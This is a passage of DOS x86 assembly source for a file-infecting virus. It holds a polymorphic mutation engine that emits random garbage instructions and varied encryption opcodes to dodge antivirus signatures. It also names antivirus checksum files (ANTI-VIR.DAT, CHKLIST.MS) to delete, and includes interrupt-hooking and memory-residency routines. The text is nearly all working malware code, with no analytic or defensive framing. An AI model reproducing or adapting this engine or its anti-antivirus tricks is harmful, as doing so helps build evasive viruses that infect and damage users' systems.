;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

ptr_sub_sub:    call gen_sub_FFFFh
                call gen_garbage
                call gen_sub_FFFFh
                ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Inc pointer reg using add reg,0001h + garbage + sub reg,FFFFh            ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

ptr_add_sub:    call gen_add_0001h
                call gen_garbage
                call gen_sub_FFFFh
                ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Inc pointer reg using sub reg,FFFFh + garbage + add reg,0001h            ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

ptr_sub_add:    call gen_sub_FFFFh
                call gen_garbage
                call gen_add_0001h
                ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Generate add reg,0001h                                                   ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

gen_add_0001h:  mov al,83h
                mov ah,byte ptr ds:[si+04h] 
                stosw
                mov al,01h
                stosb
                ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Generate sub reg,FFFFh                                                   ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

gen_sub_FFFFh:  mov al,83h
                mov ah,byte ptr ds:[si+05h]
                stosw
                mov al,0FFh
                stosb
                ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Generate inc reg                                                         ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

gen_inc_reg:    mov al,byte ptr ds:[si+06h]
                stosb
                ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Generate from 2 up to 5 garbage instructions                             ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

gen_garbage:    push si
                inc byte ptr ds:[eng_recursive]
                cmp byte ptr ds:[eng_recursive],03h
                jae unable_2_gen
                mov ax,0003h
                call rand_in_range
                inc ax
                mov cx,ax
loop_gen:       push cx
                mov ax,(offset end_generator - offset generator_table)/02h
                call rand_in_range
                add ax,ax
                mov si,offset generator_table
                add si,ax
                call word ptr ds:[si]
                pop cx
                loop loop_gen
                pop si
                ret
unable_2_gen:   mov byte ptr ds:[eng_recursive],00h
                call gen_one_byte
                pop si
                ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Generate push/garbage/pop                                                ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

gen_xpushpop:   call gen_one_push
                call gen_garbage
                call gen_one_pop
                ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Generate a conditional jump followed by some garbage code                ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

gen_cond_jump:  call get_rnd
                and al,07h
                or al,70h
                stosb
                push di
                inc di
                call gen_garbage
                mov ax,di
                pop di
                push ax
                sub ax,di
                dec ax
                stosb
                pop di
                ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Generate push/pop pairs                                                  ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

gen_push_pop:   call gen_one_push
                call gen_one_pop
                ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Generate push instruction                                                ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

gen_one_push:   mov ax,offset end_push - offset push_table
                call rand_in_range
                mov si,offset push_table
                jmp short store_byte

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Generate pop instruction                                                 ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

gen_one_pop:    mov ax,offset end_pop - offset pop_table
                call rand_in_range
                mov si,offset pop_table
                jmp short store_byte

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Generate one byte garbage                                                ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

gen_one_byte:   mov ax,offset end_one_byte - offset one_byte_table
                call rand_in_range
                mov si,offset one_byte_table

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Just store one byte from a table                                         ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

store_byte:     add si,ax
                movsb
                ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Gen mov,add,sub,adc,sbb,xor,and,or reg,reg                               ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

gen_reg_reg:    mov ax,offset end_two_byte - offset two_byte_table
                call rand_in_range
                mov si,offset two_byte_table
                call store_byte
                mov ax,offset end_reg_reg - offset reg_reg_table
                call rand_in_range
                mov si,offset reg_reg_table
                jmp short store_byte

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Gen mov,add,sub,adc,sbb,xor,and,or reg,inm (01h)                         ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

gen_inm_01h:    mov ax,offset end_inm_01h - offset inm_01h_table
                call rand_in_range
                mov si,offset inm_01h_table
                call store_byte
                call get_rnd
                stosb
                ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Gen mov,add,sub,adc,sbb,xor,and,or reg,inm (02h)                         ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

gen_inm_02h:    mov ax,(offset end_inm_02h - offset inm_02h_table)/02h
                call rand_in_range
                mov si,offset inm_02h_table
                add ax,ax
                add si,ax
                movsw
                call get_rnd
                stosb
                ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Poly engine tables                                                       ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

gen_reg_table   equ this byte                
opcodes_si      equ this byte
                db 0BEh                                 ; mov si,imm
                db 84h                                  ; add [si+nn],key
                                                        ; rol [si+nn],01h
                                                        ; inc [si+nn]
                db 0ACh                                 ; sub [si+nn],key
                db 0B4h                                 ; xor [si+nn],key
                db 8Ch                                  ; ror [si+nn],01h
                                                        ; dec [si+nn]
                db 0C6h                                 ; add si,imm
                db 0EEh                                 ; sub si,imm
                db 46h                                  ; inc si
                db 0FEh                                 ; cmp si,imm
opcodes_di      equ this byte
                db 0BFh                                 ; mov di,imm
                db 85h                                  ; add [di+nn],key
                                                        ; rol [di+nn],01h
                                                        ; inc [di+nn]
                db 0ADh                                 ; sub [di+nn],key
                db 0B5h                                 ; xor [di+nn],key
                db 8Dh                                  ; ror [di+nn],01h
                                                        ; dec [di+nn]
                db 0C7h                                 ; add di,imm
                db 0EFh                                 ; sub di,imm
                db 47h                                  ; inc di
                db 0FFh                                 ; cmp di,imm
opcodes_bx      equ this byte
                db 0BBh                                 ; mov bx,imm
                db 87h                                  ; add [bx+nn],key
                                                        ; rol [bx+nn],01h
                                                        ; inc [bx+nn]
                db 0AFh                                 ; sub [bx+nn],key
                db 0B7h                                 ; xor [bx+nn],key
                db 8Fh                                  ; ror [bx+nn],01h
                                                        ; dec [bx+nn]
                db 0C3h                                 ; add bx,imm
                db 0EBh                                 ; sub bx,imm
                db 43h                                  ; inc bx
                db 0FBh                                 ; cmp bx,imm
opcodes_bp      equ this byte
                db 0BDh                                 ; mov bp,imm
                db 86h                                  ; add [bp+nn],key
                                                        ; rol [bp+nn],01h
                                                        ; inc [bp+nn]
                db 0AEh                                 ; sub [bp+nn],key
                db 0B6h                                 ; xor [bp+nn],key
                db 8Eh                                  ; ror [bp+nn],01h
                                                        ; dec [bp+nn]
                db 0C5h                                 ; add bp,imm
                db 0EDh                                 ; sub bp,imm
                db 45h                                  ; inc bp
                db 0FDh                                 ; cmp bp,imm
end_gen_reg     equ this byte
crypt_table     equ this byte
                dw offset crypt_add
                dw offset crypt_sub
                dw offset crypt_xor
                dw offset crypt_rol
                dw offset crypt_ror
                dw offset crypt_inc
                dw offset crypt_dec
end_crypt       equ this byte
inc_ptr_table   equ this byte
                dw offset ptr_add0002h
                dw offset ptr_subFFFEh
                dw offset ptr_inc_inc
                dw offset ptr_inc_add
                dw offset ptr_add_inc
                dw offset ptr_inc_sub
                dw offset ptr_sub_inc
                dw offset ptr_add_add
                dw offset ptr_sub_sub
                dw offset ptr_add_sub
                dw offset ptr_sub_add
end_inc_ptr     equ this byte
opcodes_table   equ this byte
                dw offset opcodes_si
                dw offset opcodes_di
                dw offset opcodes_bx
                dw offset opcodes_bp
end_opcodes     equ this byte
generator_table equ this byte                           ; Garbage generators:
                dw offset gen_one_byte                  ; One byte instr
                dw offset gen_push_pop                  ; push+pop
                dw offset gen_xpushpop                  ; push+garbage+pop
                dw offset gen_reg_reg                   ; mov,add,sub,or...
                dw offset gen_cond_jump                 ; cond jmp+garbage
                dw offset gen_inm_01h                   ; Gen reg,imm
                dw offset gen_inm_02h                   ; Gen reg,imm
end_generator   equ this byte
push_table      equ this byte                           ; Push generator
                push ax
                push bx
                push cx
                push dx
                push si
                push di
                push bp
                push sp
                push cs
                push ds
                push es
                push ss
end_push        equ this byte
pop_table       equ this byte                           ; Pop generator
                pop ax
                pop cx
                pop dx
end_pop         equ this byte
one_byte_table  equ this byte                           ; One byte instrs
                aaa
                aas
                cbw
                clc
                cld
                cmc
                cwd
                daa
                das
                dec ax
                dec cx
                dec dx
                inc ax
                inc cx
                inc dx
                int 03h
                nop
                stc
                std
end_one_byte    equ this byte
two_byte_table  equ this byte
                db 8Ah                                  ; mov reg8,reg8
                db 8Bh                                  ; mov reg16,reg16
                db 02h                                  ; add reg8,reg8
                db 03h                                  ; add reg16,reg16
                db 2Ah                                  ; sub reg8,reg8
                db 2Bh                                  ; sub reg16,reg16
                db 12h                                  ; adc reg8,reg8
                db 13h                                  ; adc reg16,reg16
                db 1Ah                                  ; sbb reg8,reg8
                db 1Bh                                  ; sbb reg16,reg16
                db 32h                                  ; xor reg8,reg8
                db 33h                                  ; xor reg16,reg16
                db 22h                                  ; and reg8,reg8
                db 23h                                  ; and reg16,reg16
                db 0Ah                                  ; or reg8,reg8
                db 0Bh                                  ; or reg16,reg16
end_two_byte    equ this byte
reg_reg_table   equ this byte
                db 0C0h
                db 0C1h
                db 0C2h
                db 0C3h
                db 0C4h
                db 0C5h
                db 0C6h
                db 0C7h
                db 0C0h
                db 0C1h
                db 0C2h
                db 0C3h
                db 0C4h
                db 0C5h
                db 0C6h
                db 0C7h
end_reg_reg     equ this byte
inm_01h_table   equ this byte
                db 0B0h                                 ; mov al,imm
                db 0B4h                                 ; mov ah,imm
                db 0B2h                                 ; mov dl,imm
                db 0B6h                                 ; mov dh,imm
                db 04h                                  ; add al,imm
                db 2Ch                                  ; sub al,imm
                db 14h                                  ; adc al,imm
                db 1Ch                                  ; sbb al,imm
                db 34h                                  ; xor al,imm
                db 0Ch                                  ; or al,01h
                db 24h                                  ; and al,imm
end_inm_01h     equ this byte
inm_02h_table   equ this byte
                db 80h,0C4h                             ; add ah,1C
                db 80h,0C2h                             ; add dl,1C
                db 80h,0C6h                             ; add dh,1C
                db 80h,0ECh                             ; sub ah,1C
                db 80h,0EAh                             ; sub dl,1C
                db 80h,0EEh                             ; sub dh,1C
                db 80h,0D4h                             ; adc ah,1C
                db 80h,0D2h                             ; adc dl,1C
                db 80h,0D6h                             ; adc dh,1C
                db 80h,0DCh                             ; sbb ah,1C
                db 80h,0DAh                             ; sbb dl,1C
                db 80h,0DEh                             ; sbb dh,1C
                db 80h,0F4h                             ; xor ah,1C
                db 80h,0F2h                             ; xor dl,1C
                db 80h,0F6h                             ; xor dh,1C
                db 80h,0CCh                             ; or ah,1C
                db 80h,0CAh                             ; or dl,1C
                db 80h,0CEh                             ; or dh,1C
                db 80h,0E4h                             ; and ah,1C
                db 80h,0E2h                             ; and dl,1C
                db 80h,0E6h                             ; and dh,1C
                db 83h,0E2h                             ; and dx,0000
                db 83h,0C2h                             ; add dx,0000
                db 83h,0CAh                             ; or dx,0000
                db 83h,0F2h                             ; xor dx,0000
                db 83h,0DAh                             ; sbb dx,0000
                db 83h,0D2h                             ; adc dx,0000
                db 83h,0EAh                             ; sub dx,0000
end_inm_02h     equ this byte

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ File names to delete inside the int 21h level encryption                 ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

del_this_shit01 db "ANTI-VIR.DAT",00h
del_this_shit02 db "CHKLIST.MS",00h
                dd 00000000h
end_area03h     equ this byte
                dd 00000000h

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Memory allocation routine                                                ³
;³ On entry:                                                                ³
;³    SI    -> number of paragraphs to allocate                             ³
;³ On exit:                                                                 ³
;³    DI    -> allocated base address (0000h if error)                      ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

mem_alloc:      xor di,di                               ; Error flag
                mov ax,5800h                            ; Get and save memory
                int 21h                                 ; allocation strategy
                jnc mem_ok_1
                ret
mem_ok_1:       push ax
                mov ax,5801h                            ; Set new allocation
                mov bx,0080h                            ; strategy to first
                int 21h                                 ; fit high then low
mem_ok_2:       mov ax,5802h                            ; Get and save UMB
                int 21h                                 ; link state
                jc mem_error_1
                xor ah,ah
                push ax
                mov ax,5803h                            ; UMB link state on
                mov bx,0001h
                int 21h
                mov ah,48h                              ; Allocate memory
                mov bx,si
                int 21h
                jc mem_error_2
                mov di,ax
mem_error_2:    mov ax,5803h                            ; Restore UMB
                pop bx                                  ; link state
                int 21h
mem_error_1:    mov ax,5801h                            ; Restore allocation
                pop bx                                  ; strategy
                int 21h
                ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Timer-based random number generator                                      ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

get_rnd:        push cx
                in ax,40h                               ; Get a random number
                mov cl,al                               ; using the timer
                xor al,ah                               ; port
                xor ah,cl
                xor ax,word ptr cs:[randomize]
                mov word ptr cs:[randomize],ax
                pop cx
                ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Generate a 16bit random number                                           ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
rand_16:        push bx
                call get_rnd                            ; Get a 16bit random
                mov bl,al                               ; number using our
                call get_rnd                            ; 8bit rnd generator
                mov bh,al
                call get_rnd
                xor bl,al
                call get_rnd
                xor bh,al
                xchg bx,ax
                pop bx
                ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Generate a random number between 0 and AX                                ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

rand_in_range:  push bx                                 ; Returns a random
                push dx                                 ; number between 0 and
                xchg ax,bx                              ; the entry in AX
                call get_rnd
                xor dx,dx
                div bx
                xchg ax,dx                              ; Reminder in DX
                pop dx
                pop bx
                ret
                dd 00000000h
end_area02h     equ this byte
                dd 00000000h

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Return the al vector in ES:BX                                            ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

get_int:        push ax
                xor ah,ah
                rol ax,1
                rol ax,1
                xchg bx,ax
                xor ax,ax
                mov es,ax
                les bx,dword ptr es:[bx+00h]
                pop ax
                ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Set al interrupt vector to DS:DX                                         ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

set_int:        push ax
                push bx
                push ds
                cli
                xor ah,ah
                rol ax,1
                rol ax,1
                xchg ax,bx
                push ds
                xor ax,ax
                mov ds,ax
                mov word ptr ds:[bx+00h],dx
                pop word ptr ds:[bx+02h]
                sti
                pop ds
                pop bx
                pop ax
                ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Save all the registers in the stack                                      ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

push_all:       cli
                pop word ptr cs:[ret_push]
                pushf
                push ax
                push bx
                push cx
                push dx
                push bp
                push si
                push di
                push es
                push ds
                push word ptr cs:[ret_push]
                sti
                ret
ret_push        dw 0000h                        ; Caller address

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Restore all the registers from the stack                                 ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

pop_all:        cli
                pop word ptr cs:[ret_pop]
                pop ds
                pop es
                pop di
                pop si
                pop bp
                pop dx
                pop cx
                pop bx
                pop ax
                popf
                push word ptr cs:[ret_pop]
                sti
                ret
ret_pop         dw 0000h                        ; Caller address
                dd 00000000h
end_area01h     equ this byte
                dd 00000000h

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Virus buffers (inserted into infections)                                 ³
